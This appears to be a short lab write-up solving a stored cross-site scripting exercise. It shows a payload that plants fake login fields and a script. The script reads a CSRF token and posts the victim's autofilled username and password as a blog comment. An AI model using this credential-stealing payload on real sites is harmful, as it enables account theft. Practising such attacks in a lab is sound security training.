Again, I don't have Burp Collaborator and can't use other public servers. I'll use the CSRF method again.

My solution:


First we go to /login and copy the code for the username and password tables, which is:

<input required="" type="username" name="username">
<input required="" type="password" name="password">

We'll add an id to the username input to make it accessible:

<input required="" type="username" name="username", id=username>

And we can use the onchange event to send the creds as a comment:

<script>
var csrf;

function getCsrf () {
  const pageSource = this.responseText;
  csrf = pageSource.match('name="csrf" value="(.*)"')[1]

  console.log(csrf)
}

function sendComment(user, pw) {
  const postId = window.location.href.match('postId=(.*)')[1]

  console.log(csrf, postId, user, pw)

  const changeEmailRequest = new XMLHttpRequest();
  changeEmailRequest.open("POST", "/post/comment");
  changeEmailRequest.send(`csrf=${csrf}&postId=${postId}&comment=${''.concat('>', user, '<>', pw)}&name=a&email=a@a.com&website=http://stam.com')`)
}

// Get CSRF
var req = new XMLHttpRequest();
req.addEventListener("load", getCsrf);
req.open("GET", "/my-account");
req.send();
</script>

<input required="" type="username" name="username", id=username>
<input required="" type="password" name="password" onchange="sendComment(username.value, this.value);">
